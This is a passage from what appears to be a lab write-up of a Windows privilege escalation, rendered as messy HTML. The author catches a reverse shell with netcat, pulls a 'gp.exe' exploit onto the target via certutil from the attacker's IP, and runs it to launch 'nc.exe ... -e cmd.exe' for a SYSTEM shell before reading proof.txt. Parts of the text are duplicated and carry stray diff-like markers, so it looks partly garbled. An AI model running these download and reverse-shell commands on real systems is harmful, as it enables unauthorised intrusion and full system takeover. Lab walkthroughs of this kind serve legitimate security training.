0.1px;"><span class="cm-error">┌──</span><span class="cm-punctuation">(</span><span class="cm-identifier">kali</span><span class="cm-error">㉿</span><span class="cm-identifier">kali</span><span class="cm-punctuation">)</span><span class="cm-operator">-</span><span class="cm-punctuation">[</span><span class="cm-error">~</span><span class="cm-operator">/</span><span class="cm-identifier">Desktop</span><span class="cm-punctuation">]</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">└─$</span> <span class="cm-identifier">rlwrap</span> <span class="cm-identifier">nc</span> <span class="cm-operator">-</span><span class="cm-identifier">lvnp</span> <span class="cm-number">443</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">listening</span> <span class="cm-identifier">on</span> <span class="cm-punctuation">[</span><span class="cm-identifier">any</span><span class="cm-punctuation">]</span> <span class="cm-number">443</span> <span class="cm-operator">..</span><span class="cm-punctuation">.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">connect</span> <span class="cm-identifier">to</span> <span class="cm-punctuation">[</span><span class="cm-number">192.168.45.236</span><span class="cm-punctuation">]</span> <span class="cm-keyword">from</span> <span class="cm-punctuation">(</span><span class="cm-identifier">UNKNOWN</span><span class="cm-punctuation">)</span> <span class="cm-punctuation">[</span><span class="cm-number">192.168.164.169</span><span class="cm-punctuation">]</span> <span class="cm-number">50245</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Microsoft</span> <span class="cm-identifier">Windows</span> <span class="cm-punctuation">[</span><span class="cm-identifier">Version</span> <span class="cm-number">10.0.17763.2029</span><span class="cm-punctuation">]</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">(</span><span class="cm-identifier">c</span><span class="cm-punctuation">)</span> <span class="cm-number">2018</span> <span class="cm-identifier">Microsoft</span> <span class="cm-identifier">Corporation</span><span class="cm-punctuation">.</span> <span class="cm-identifier">All</span> <span class="cm-identifier">rights</span> <span class="cm-identifier">reserved</span><span class="cm-punctuation">.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">C:</span><span class="cm-error">\\</span><span class="cm-identifier">Windows</span><span class="cm-error">\\</span><span class="cm-identifier">system32</span><span class="cm-operator">&gt;</span><span class="cm-identifier">whoami</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">whoami</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 222px;"></div><div class="CodeMirror-gutters" style="display: none; height: 222px;"></div></div></div></pre><p><span>Found </span><code>proof.txt</code></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="powershell" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="powershell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3438px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">C:</span><span class="cm-error">\\</span><span class="cm-identifier">Users</span><span class="cm-error">\\</span><span class="cm-identifier">Administrator</span><span class="cm-error">\\</span><span class="cm-identifier">Desktop</span><span class="cm-operator">&gt;</span><span class="cm-builtin">dir</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">dir</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> <span class="cm-identifier">Volume</span> <span class="cm-keyword">in</span> <span class="cm-identifier">drive</span> <span class="cm-identifier">C</span> <span class="cm-identifier">has</span> <span class="cm-identifier">no</span> <span class="cm-identifier">label</span><span class="cm-punctuation">.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> <span class="cm-identifier">Volume</span> <span class="cm-identifier">Serial</span> <span class="cm-identifier">Number</span> <span class="cm-identifier">is</span> <span class="cm-number">5</span><span class="cm-identifier">C30-DCD7</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
+</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Privilege</span> <span class="cm-identifier">Name</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-identifier">Description</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-identifier">State</span> &nbsp; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">=============================</span> <span class="cm-operator">=========================================</span> <span class="cm-operator">========</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">SeTcbPrivilege</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-identifier">Act</span> <span class="cm-identifier">as</span> <span class="cm-identifier">part</span> <span class="cm-identifier">of</span> <span class="cm-identifier">the</span> <span class="cm-identifier">operating</span> <span class="cm-identifier">system</span> &nbsp; &nbsp; &nbsp; <span class="cm-identifier">Disabled</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">SeChangeNotifyPrivilege</span> &nbsp; &nbsp; &nbsp; <span class="cm-identifier">Bypass</span> <span class="cm-identifier">traverse</span> <span class="cm-identifier">checking</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-identifier">Enabled</span> </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">SeImpersonatePrivilege</span> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-identifier">Impersonate</span> <span class="cm-identifier">a</span> <span class="cm-identifier">client</span> <span class="cm-identifier">after</span> <span class="cm-identifier">authentication</span> <span class="cm-identifier">Enabled</span> </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">SeCreateGlobalPrivilege</span> &nbsp; &nbsp; &nbsp; <span class="cm-identifier">Create</span> <span class="cm-identifier">global</span> <span class="cm-identifier">objects</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-identifier">Enabled</span> </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">SeIncreaseWorkingSetPrivilege</span> <span class="cm-identifier">Increase</span> <span class="cm-identifier">a</span> <span class="cm-keyword">process</span> <span class="cm-identifier">working</span> <span class="cm-builtin">set</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-identifier">Disabled</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 263px;"></div><div class="CodeMirror-gutters" style="display: none; height: 263px;"></div></div></div></pre><p><span>I transferred </span><code>gp.exe</code><span> to the target machine.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="powershell"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="powershell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">C:</span><span class="cm-error">\\</span><span class="cm-identifier">Users</span><span class="cm-error">\\</span><span class="cm-identifier">Public</span><span class="cm-operator">&gt;</span><span class="cm-identifier">certutil</span> <span class="cm-operator">-</span><span class="cm-identifier">urlcache</span> <span class="cm-operator">-split</span> <span class="cm-operator">-f</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">http</span><span class="cm-operator">://</span><span class="cm-number">192.168.45.236</span><span class="cm-operator">/</span><span class="cm-builtin">gp</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span><span class="cm-operator">&gt;</span> <span class="cm-builtin">gp</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">****</span> &nbsp;<span class="cm-identifier">Online</span> &nbsp;<span class="cm-operator">****</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-number">0000</span> &nbsp;<span class="cm-operator">..</span><span class="cm-punctuation">.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-identifier">e000</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">CertUtil</span><span class="cm-operator">:</span> <span class="cm-operator">-</span><span class="cm-identifier">URLCache</span> <span class="cm-identifier">command</span> <span class="cm-identifier">completed</span> <span class="cm-identifier">successfully</span><span class="cm-punctuation">.</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 110px;"></div><div class="CodeMirror-gutters" style="display: none; height: 110px;"></div></div></div></pre><p><span>I executed a command through </span><code>gp.exe</code><span> to trigger another reverse shell using </span><code>nc.exe</code><span> with </span><code>System</code><span> privileges.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="powershell"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="powershell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">C:</span><span class="cm-error">\\</span><span class="cm-identifier">Users</span><span class="cm-error">\\</span><span class="cm-identifier">Public</span><span class="cm-operator">&gt;</span><span class="cm-punctuation">.</span><span class="cm-error">\\</span><span class="cm-builtin">gp</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-operator">-</span><span class="cm-identifier">cmd</span> <span class="cm-string">"nc.exe 192.168.45.236 443 -e C:\\Windows\\System32\\cmd.exe"</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 22px;"></div><div class="CodeMirror-gutters" style="display: none; height: 22px;"></div></div></div></pre><h1 id='shell-as-system'><span>Shell as </span><code>system</code></h1><p><span>The exploit was successful, granting me a shell as </span><code>NT AUTHORITY\\SYSTEM</code><span> .</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="powershell"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="powershell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">┌──</span><span class="cm-punctuation">(</span><span class="cm-identifier">kali</span><span class="cm-error">㉿</span><span class="cm-identifier">kali</span><span class="cm-punctuation">)</span><span class="cm-operator">-</span><span class="cm-punctuation">[</span><span class="cm-error">~</span><span class="cm-operator">/</span><span class="cm-identifier">Desktop</span><span class="cm-punctuation">]</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-error">└─$</span> <span class="cm-identifier">rlwrap</span> <span class="cm-identifier">nc</span> <span class="cm-operator">-</span><span class="cm-identifier">lvnp</span> <span class="cm-number">443</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">listening</span> <span class="cm-identifier">on</span> <span class="cm-punctuation">[</span><span class="cm-identifier">any</span><span class="cm-punctuation">]</span> <span class="cm-number">443</span> <span class="cm-operator">..</span><span class="cm-punctuation">.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">connect</span> <span class="cm-identifier">to</span> <span class="cm-punctuation">[</span><span class="cm-number">192.168.45.236</span><span class="cm-punctuation">]</span> <span class="cm-keyword">from</span> <span class="cm-punctuation">(</span><span class="cm-identifier">UNKNOWN</span><span class="cm-punctuation">)</span> <span class="cm-punctuation">[</span><span class="cm-number">192.168.164.169</span><span class="cm-punctuation">]</span> <span class="cm-number">50245</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Microsoft</span> <span class="cm-identifier">Windows</span> <span class="cm-punctuation">[</span><span class="cm-identifier">Version</span> <span class="cm-number">10.0.17763.2029</span><span class="cm-punctuation">]</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">(</span><span class="cm-identifier">c</span><span class="cm-punctuation">)</span> <span class="cm-number">2018</span> <span class="cm-identifier">Microsoft</span> <span class="cm-identifier">Corporation</span><span class="cm-punctuation">.</span> <span class="cm-identifier">All</span> <span class="cm-identifier">rights</span> <span class="cm-identifier">reserved</span><span class="cm-punctuation">.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
+</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">C:</span><span class="cm-error">\\</span><span class="cm-identifier">Windows</span><span class="cm-error">\\</span><span class="cm-identifier">system32</span><span class="cm-operator">&gt;</span><span class="cm-identifier">whoami</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">whoami</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 197px;"></div><div class="CodeMirror-gutters" style="display: none; height: 197px;"></div></div></div></pre><p><span>Found </span><code>proof.txt</code></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="powershell" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="powershell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">C:</span><span class="cm-error">\\</span><span class="cm-identifier">Users</span><span class="cm-error">\\</span><span class="cm-identifier">Administrator</span><span class="cm-error">\\</span><span class="cm-identifier">Desktop</span><span class="cm-operator">&gt;</span><span class="cm-builtin">dir</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">dir</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> <span class="cm-identifier">Volume</span> <span class="cm-keyword">in</span> <span class="cm-identifier">drive</span> <span class="cm-identifier">C</span> <span class="cm-identifier">has</span> <span class="cm-identifier">no</span> <span class="cm-identifier">label</span><span class="cm-punctuation">.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> <span class="cm-identifier">Volume</span> <span class="cm-identifier">Serial</span> <span class="cm-identifier">Number</span> <span class="cm-identifier">is</span> <span class="cm-number">5</span><span class="cm-identifier">C30-DCD7</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
 </span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> <span class="cm-identifier">Directory</span> <span class="cm-identifier">of</span> <span class="cm-builtin">C:</span><span class="cm-error">\\</span><span class="cm-identifier">Users</span><span class="cm-error">\\</span><span class="cm-identifier">Administrator</span><span class="cm-error">\\</span><span class="cm-identifier">Desktop</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
 </span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">07</span><span class="cm-operator">/</span><span class="cm-number">13</span><span class="cm-operator">/</span><span class="cm-number">2021</span> &nbsp;<span class="cm-number">02</span><span class="cm-operator">:</span><span class="cm-number">38</span> <span class="cm-identifier">AM</span> &nbsp; &nbsp;<span class="cm-operator">&lt;</span><span class="cm-builtin">DIR</span><span class="cm-operator">&gt;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-punctuation">.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">07</span><span class="cm-operator">/</span><span class="cm-number">13</span><span class="cm-operator">/</span><span class="cm-number">2021</span> &nbsp;<span class="cm-number">02</span><span class="cm-operator">:</span><span class="cm-number">38</span> <span class="cm-identifier">AM</span> &nbsp; &nbsp;<span class="cm-operator">&lt;</span><span class="cm-builtin">DIR</span><span class="cm-operator">&gt;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-operator">..</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">01</span><span class="cm-operator">/</span><span class="cm-number">17</span><span class="cm-operator">/</span><span class="cm-number">2026</span> &nbsp;<span class="cm-number">08</span><span class="cm-operator">:</span><span class="cm-number">02</span> <span class="cm-identifier">AM</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">34</span> <span class="cm-identifier">proof</span><span class="cm-punctuation">.</span><span class="cm-identifier">txt</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">1</span> <span class="cm-identifier">File</span><span class="cm-punctuation">(</span><span class="cm-identifier">s</span><span class="cm-punctuation">)</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">34</span> <span class="cm-identifier">bytes</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">2</span> <span class="cm-builtin">Dir</span><span class="cm-punctuation">(</span><span class="cm-identifier">s</span><span class="cm-punctuation">)</span> &nbsp;<span class="cm-number">10</span><span class="cm-punctuation">,</span><span class="cm-number">412</span><span class="cm-punctuation">,</span><span class="cm-number">666</span><span class="cm-punctuation">,</span><span class="cm-number">880</span> <span class="cm-identifier">bytes</span> <span class="cm-identifier">free</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">C:</span><span class="cm-error">\\</span><span class="cm-identifier">Users</span><span class="cm-error">\\</span><span class="cm-identifier">Administrator</span><span class="cm-error">\\</span><span class="cm-identifier">Desktop</span><span class="cm-operator">&gt;</span><span class="cm-builtin">type</span> <span class="cm-identifier">proof</span><span class="cm-punctuation">.</span><span class="cm-identifier">txt</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">type</span> <span class="cm-identifier">proof</span><span class="cm-punctuation">.</span><span class="cm-identifier">txt</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">6</span><span class="cm-identifier">c6</span><span class="cm-operator">..</span><span class="cm-punctuation">.</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 395px;"></div><div class="CodeMirror-gutters" style="display: none; height: 395px;"></div></div></div></pre></div></div>
+</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">C:</span><span class="cm-error">\\</span><span class="cm-identifier">Users</span><span class="cm-error">\\</span><span class="cm-identifier">Administrator</span><span class="cm-error">\\</span><span class="cm-identifier">Desktop</span><span class="cm-operator">&gt;</span><span class="cm-builtin">type</span> <span class="cm-identifier">proof</span><span class="cm-punctuation">.</span><span class="cm-identifier">txt</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">type</span> <span class="cm-identifier">proof</span><span class="cm-punctuation">.</span><span class="cm-identifier">txt</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">6</span><span class="cm-identifier">c6</span><span class="cm-operator">..</span><span class="cm-punctuation">.</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 351px;"></div><div class="CodeMirror-gutters" style="display: none; height: 351px;"></div></div></div></pre></div></div>
 </body>
 </html>
